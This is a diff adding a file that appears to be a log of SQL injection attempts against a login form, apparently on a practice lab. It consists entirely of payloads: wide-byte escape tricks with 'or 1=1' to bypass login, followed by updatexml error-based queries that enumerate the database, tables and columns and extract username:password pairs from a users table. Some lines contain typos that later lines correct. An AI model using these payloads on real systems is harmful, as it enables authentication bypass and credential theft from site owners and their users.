@@ -1,0 +1,38 @@
+User Name:adminPassword:1'
+User Name:adminPassword:1%bf' or 1=1;
+User Name:123Password:123
+User Name:123Password:123
+User Name:12Password:123
+User Name:12Password:1ß' or 1=1;#
+User Name:12Password:ß' or 1=1;#
+User Name:adminPassword:1%df' or 1=1;#
+User Name:12Password:ß' or 1=1;#
+User Name:12Password:ß" or 1=1;#
+User Name:12Password:ÿ" or 1=1;#
+User Name:12Password:我iÿ" or 1=1;#
+User Name:12Password:ÿ" or 1=1;#
+User Name:12Password:ÿ' or 1=1;#
+User Name:12Password:¿' or 1=1;#
+User Name:12Password:' or 1=1;#
+User Name:12ß' or 1=1;#Password:
+User Name:admin%df' or 1=1;#Password:1
+User Name:adminPassword:1%df' or 1=1#
+User Name:adminPassword:1%df' or 1=1--+
+User Name:adminPassword:1%df' or 1=1#
+User Name:adminPassword:1\%df' or 1=1#
+User Name:adminPassword:1#df' or 1=1#
+User Name:adminPassword:1�' or 1=1#
+User Name:adminPassword:1�' or 1=1#
+User Name:adminPassword:1�' or updataxml(1,concat(0x7e,(length(database())),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,(length(database())),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,(select database()),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_shema=database()),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),32),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),28),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(user,3a,password) from security.users),0),0x7e),1)
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(user,3a,password) from security.users),0),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(username,3a,password) from security.users),0),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from security.users),0),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from security.users),32),0x7e),1)#
